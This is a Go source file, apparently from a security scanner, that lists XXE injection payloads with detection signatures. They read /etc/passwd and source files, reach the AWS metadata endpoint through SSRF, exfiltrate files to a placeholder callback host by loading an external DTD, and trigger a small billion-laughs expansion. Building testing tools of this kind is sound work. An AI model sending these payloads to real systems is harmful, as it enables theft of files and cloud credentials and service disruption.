package payloads

// XXEPayloads returns XML External Entity injection payloads covering
// local file disclosure, OOB exfiltration, parameter entity, and DoS techniques.
// Aligned with OWASP A05:2021 / CWE-611.
func XXEPayloads() PayloadSet {
	return PayloadSet{
		Category:    PayloadXXE,
		Description: "XML External Entity Injection payloads â€“ OWASP A05:2021 / CWE-611",
		Payloads: []Payload{
			// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Classic File Read â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
			{
				ID: "xxe-file-etc-passwd", Category: PayloadXXE,
				Name:      "Classic /etc/passwd Read",
				Value:     `<?xml version="1.0"?><!DOCTYPE vyomite [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`,
				Contexts:  []InjectionContext{ContextXMLBody},
				Detection: DetectReflection, DetectSignature: `root:.*:0:0:`,
				RiskLevel: "MODERATE", SafeMode: false, TargetStack: []string{"Linux", "Unix"},
				CWE: "CWE-611", OWASPCategory: "A05:2021",
				Description: "Classic XXE to read /etc/passwd via external entity",
			},
			{
				ID: "xxe-file-win-hosts", Category: PayloadXXE,
				Name:      "Windows hosts File Read",
				Value:     `<?xml version="1.0"?><!DOCTYPE vyomite [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]><root>&xxe;</root>`,
				Contexts:  []InjectionContext{ContextXMLBody},
				Detection: DetectReflection, DetectSignature: `(?i)(localhost|127\.0\.0\.1)`,
				RiskLevel: "MODERATE", SafeMode: false, TargetStack: []string{"Windows"},
				CWE: "CWE-611", OWASPCategory: "A05:2021",
				Description: "XXE to read Windows hosts file",
			},
			{
				ID: "xxe-php-filter", Category: PayloadXXE,
				Name:      "PHP Filter Base64 Read",
				Value:     `<?xml version="1.0"?><!DOCTYPE vyomite [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><root>&xxe;</root>`,
				Contexts:  []InjectionContext{ContextXMLBody},
				Detection: DetectReflection, DetectSignature: `[A-Za-z0-9+/]{40,}={0,2}`,
				RiskLevel: "MODERATE", SafeMode: false, TargetStack: []string{"PHP"},
				CWE: "CWE-611", OWASPCategory: "A05:2021",
				Description: "PHP stream wrapper to read source files as base64",
			},

			// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ SSRF via XXE â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
			{
				ID: "xxe-ssrf-aws-metadata", Category: PayloadXXE,
				Name:      "XXE SSRF to AWS Metadata",
				Value:     `<?xml version="1.0"?><!DOCTYPE vyomite [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>`,
				Contexts:  []InjectionContext{ContextXMLBody},
				Detection: DetectReflection, DetectSignature: `(?i)(ami-id|instance-id)`,
				RiskLevel: "MODERATE", SafeMode: false, TargetStack: []string{"AWS"},
				CWE: "CWE-611", OWASPCategory: "A05:2021",
				Description: "XXE as SSRF vector to reach AWS metadata endpoint",
			},
			{
				ID: "xxe-ssrf-internal", Category: PayloadXXE,
				Name:      "XXE SSRF to Internal Network",
				Value:     `<?xml version="1.0"?><!DOCTYPE vyomite [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">]><root>&xxe;</root>`,
				Contexts:  []InjectionContext{ContextXMLBody},
				Detection: DetectStatusCode,
				RiskLevel: "MODERATE", SafeMode: false,
				CWE: "CWE-611", OWASPCategory: "A05:2021",
				Description: "XXE to probe internal services on localhost",
			},

			// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Out-of-Band (OOB) Exfiltration â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
			{
				ID: "xxe-oob-http-exfil", Category: PayloadXXE,
				Name:      "OOB HTTP Exfiltration",
				Value:     `<?xml version="1.0"?><!DOCTYPE vyomite [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://VYOMITE_OOB_HOST/evil.dtd">%dtd;]><root>&send;</root>`,
				Contexts:  []InjectionContext{ContextXMLBody},
				Detection: DetectOOBCallback,
				RiskLevel: "MODERATE", SafeMode: false, TargetStack: []string{"Linux", "Unix"},
				CWE: "CWE-611", OWASPCategory: "A05:2021",
				Description: "OOB exfiltration via external DTD loading â€” requires callback server",
			},
			{
				ID: "xxe-oob-ftp-exfil", Category: PayloadXXE,
				Name:      "OOB FTP Exfiltration",
				Value:     `<?xml version="1.0"?><!DOCTYPE vyomite [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://VYOMITE_OOB_HOST/ftp.dtd">%dtd;]><root>&send;</root>`,
				Contexts:  []InjectionContext{ContextXMLBody},
				Detection: DetectOOBCallback,
				RiskLevel: "MODERATE", SafeMode: false, TargetStack: []string{"Linux", "Unix", "Java"},
				CWE: "CWE-611", OWASPCategory: "A05:2021",
				Description: "FTP-based OOB exfiltration for multi-line file reads (Java parsers)",
			},

			// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Parameter Entity â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
			{
				ID: "xxe-param-entity-probe", Category: PayloadXXE,
				Name:      "Parameter Entity Detection",
				Value:     `<?xml version="1.0"?><!DOCTYPE vyomite [<!ENTITY % xxe SYSTEM "http://VYOMITE_OOB_HOST/probe">%xxe;]><root>test</root>`,
				Contexts:  []InjectionContext{ContextXMLBody},
				Detection: DetectOOBCallback,
				RiskLevel: "SAFE", SafeMode: true,
				CWE: "CWE-611", OWASPCategory: "A05:2021",
				Description: "Parameter entity probe to detect if external entities are processed",
			},

			// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Billion Laughs (DoS Probe) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
			{
				ID: "xxe-billion-laughs-mini", Category: PayloadXXE,
				Name:      "Billion Laughs (3 Layers)",
				Value:     `<?xml version="1.0"?><!DOCTYPE vyomite [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><root>&lol3;</root>`,
				Contexts:  []InjectionContext{ContextXMLBody},
				Detection: DetectTimeDelta, DelayMs: 3000,
				RiskLevel: "MODERATE", SafeMode: false,
				CWE: "CWE-776", OWASPCategory: "A05:2021",
				Description: "Miniaturized Billion Laughs (3-layer) to detect entity expansion without full DoS",
			},

			// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ XInclude â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
			{
				ID: "xxe-xinclude-passwd", Category: PayloadXXE,
				Name:      "XInclude File Read",
				Value:     `<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></root>`,
				Contexts:  []InjectionContext{ContextXMLBody},
				Detection: DetectReflection, DetectSignature: `root:.*:0:0:`,
				RiskLevel: "MODERATE", SafeMode: false, TargetStack: []string{"Linux", "Unix"},
				CWE: "CWE-611", OWASPCategory: "A05:2021",
				Description: "XInclude-based XXE when you can't control the root DOCTYPE",
			},

			// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ SVG/Docx Embedded XXE â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
			{
				ID: "xxe-svg-embedded", Category: PayloadXXE,
				Name:      "SVG Embedded XXE",
				Value:     `<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>`,
				Contexts:  []InjectionContext{ContextXMLBody},
				Detection: DetectReflection, DetectSignature: `.+`,
				RiskLevel: "MODERATE", SafeMode: false,
				CWE: "CWE-611", OWASPCategory: "A05:2021",
				Description: "XXE embedded in SVG upload â€” common in image processing endpoints",
			},
		},
	}
}
